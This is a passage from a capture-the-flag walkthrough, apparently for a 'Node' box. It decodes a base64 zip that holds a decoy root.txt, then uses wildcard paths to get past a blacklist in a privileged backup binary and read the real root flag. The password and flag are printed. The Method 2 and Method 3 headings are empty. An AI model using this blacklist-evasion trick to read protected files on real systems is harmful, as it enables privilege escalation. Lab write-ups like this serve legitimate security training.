UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==

```

this content was a troll.

```bash
echo -n "UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==" | base64 -d > backup.bin
7z e backup.bin
```

This extracted¬†**root.txt**¬†file and contains troll.

![[Node-22.png]]

Upon decoding and extracting this backup, `root.txt` won't be quite what it seems.

By replacing some characters with wildcards, it is possible to evade the blacklist and grab the root flag.

```bash
cd /tmp
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /r**t/r**t.txt | base64 -d > root.zip
unzip root.zip
# Password: magicword
cat /tmp/root/root.txt
# flag
1722e99ca5f353b362556a62bd5e6be0
```

![[Node-24.png]]

## Method 2 - Command Injection (Medium)

## Method3 - Buffer overflow

